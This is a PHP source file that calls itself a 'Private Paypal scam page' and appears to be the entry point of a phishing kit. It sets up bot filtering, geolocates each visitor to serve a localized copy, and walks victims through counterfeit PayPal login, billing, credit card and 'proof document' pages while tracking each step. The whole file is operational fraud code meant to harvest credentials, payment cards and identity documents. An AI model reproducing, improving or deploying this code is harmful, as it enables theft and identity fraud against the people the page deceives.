<?php
session_start();
error_reporting(0);
define("INC", "true");
/*
   _____ _______     _______ _______ ____  _____  _    ___     _________ _    _ __  __
  / ____|  __ \ \   / /  __ \__   __/ __ \|  __ \| |  | \ \   / /__   __| |  | |  \/  |
 | |    | |__) \ \_/ /| |__) | | | | |  | | |__) | |__| |\ \_/ /   | |  | |__| | \  / |
 | |    |  _  / \   / |  ___/  | | | |  | |  _  /|  __  | \   /    | |  |  __  | |\/| |
 | |____| | \ \  | |  | |      | | | |__| | | \ \| |  | |  | |     | |  | |  | | |  | |
  \_____|_|  \_\ |_|  |_|      |_|  \____/|_|  \_\_|  |_|  |_|     |_|  |_|  |_|_|  |_|
                      V2.1 Private Paypal scam page [PRV8 FIX]
*/
require("inc/system.inc.php");
require("inc/country.inc.php");
require("antibots.php");
include("track/module.php");
if($_setup) {
  $countrycode = "";
  if(!isset($_SESSION['cd'])) {
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = @$_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        $_SESSION['_ip_'] = $ip = $forward;
    }
    else{
        $_SESSION['_ip_'] = $ip = $remote;
    }
    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$_SESSION['_ip_']));
    if($ip_data && $ip_data->geoplugin_countryCode != null){
        $countrycode = $ip_data->geoplugin_countryCode;
        $_SESSION['cd'] = $countrycode;
    } else {
      $_SESSION['cd'] = "US";
      $countrycode = "US";
    }
    ?>
    <script>
    window.location = "?country.x=<?php echo $_SESSION['cd']; ?>&locale.x=en_<?php echo $_SESSION['cd']; ?>>&client=<?php echo md5(rand()); ?>";
    </script>
    <?php
  } else {
    ?>
    <?php
    if ($_SESSION['cd'] == "FR" || $_SESSION['cd'] == "DZ" || $_SESSION['cd'] == "MA" || $_SESSION['cd'] == "TN" || $_SESSION['cd'] == "CD" || $_SESSION['cd'] == "MG" || $_SESSION['cd'] == "CM" || $_SESSION['cd'] == "CA" || $_SESSION['cd'] == "CI" || $_SESSION['cd'] == "BF" || $_SESSION['cd'] == "NE" || $_SESSION['cd'] == "SN" || $_SESSION['cd'] == "ML" || $_SESSION['cd'] == "RW" || $_SESSION['cd'] == "BE" || $_SESSION['cd'] == "GF" || $_SESSION['cd'] == "TD" || $_SESSION['cd'] == "HT" || $_SESSION['cd'] == "BI" || $_SESSION['cd'] == "BJ" || $_SESSION['cd'] == "CH" || $_SESSION['cd'] == "TG" || $_SESSION['cd'] == "CF" || $_SESSION['cd'] == "CG" || $_SESSION['cd'] == "GA" || $_SESSION['cd'] == "KM" || $_SESSION['cd'] == "GK" || $_SESSION['cd'] == "DJ" || $_SESSION['cd'] == "LU" || $_SESSION['cd'] == "VU" || $_SESSION['cd'] == "SC" || $_SESSION['cd'] == "MC") {
        require_once("lang/fr.php");
    } elseif ($_SESSION['cd'] == "MX" || $_SESSION['cd'] == "PH" || $_SESSION['cd'] == "ES" || $_SESSION['cd'] == "CO" || $_SESSION['cd'] == "AR" || $_SESSION['cd'] == "PE" || $_SESSION['cd'] == "VE" || $_SESSION['cd'] == "CL" || $_SESSION['cd'] == "EC" || $_SESSION['cd'] == "GT" || $_SESSION['cd'] == "CU" || $_SESSION['cd'] == "HN" || $_SESSION['cd'] == "PY" || $_SESSION['cd'] == "SV" || $_SESSION['cd'] == "NI" || $_SESSION['cd'] == "CR" || $_SESSION['cd'] == "UY") {
        require_once("lang/es.php");
    } elseif ($_SESSION['cd'] == "IT" || $_SESSION['cd'] == "SM") {
       require_once("lang/it.php");
    } elseif ($_SESSION['cd'] == "RU" || $_SESSION['cd'] == "BY" || $_SESSION['cd'] == "KZ" || $_SESSION['cd'] == "KG" || $_SESSION['cd'] == "TJ") {
        require_once("lang/ru.php");
    } elseif ($_SESSION['cd'] == "PT" || $_SESSION['cd'] == "BR" || $_SESSION['cd'] == "AO" || $_SESSION['cd'] == "MZ" || $_SESSION['cd'] == "MO") {
        require_once("lang/pt.php");
    } elseif ($_SESSION['cd'] == "TR" || $_SESSION['cd'] == "cy") {
        require_once("lang/tr.php");
    } elseif ($_SESSION['cd'] == "PL") {
        require_once("lang/pl.php");
    } elseif ($_SESSION['cd'] == "NO") {
        require_once("lang/no.php");
    } elseif ($_SESSION['cd'] == "NL" || $_SESSION['cd'] == "AW") {
        require_once("lang/nl.php");
    } elseif ($_SESSION['cd'] == "DE" || $_SESSION['cd'] == "CH") {
        require_once("lang/de.php");
    } else {
       require_once("lang/en.php");
    }
    if(!isset($_GET['client'])) {
      ?>
      <script>
      window.location = "?country.x=<?php echo $_SESSION['cd']; ?>&locale.x=en_<?php echo $_SESSION['cd']; ?>&client=<?php echo md5(rand()); ?>";
      </script>
      <?php
    } else {
      if(!isset($_SESSION['step'])) {
        require("login.php");
        track("Login page", $_SESSION['cd']);
      } else if($_SESSION['step'] == "s1") {
        require("account/index.php");
        track("Billing page", $_SESSION['cd']);
      } else if($_SESSION['step'] == "s2") {
        require("account/credit.php");
        track("Credit card page", $_SESSION['cd']);
      } else if($_SESSION['step'] == "s3") {
        require("account/proof.php");
        track("Proof document page", $_SESSION['cd']);
      }
    }
  }
} else {
  ?>
  <script>window.location="install";</script>
  <?php
}
?>
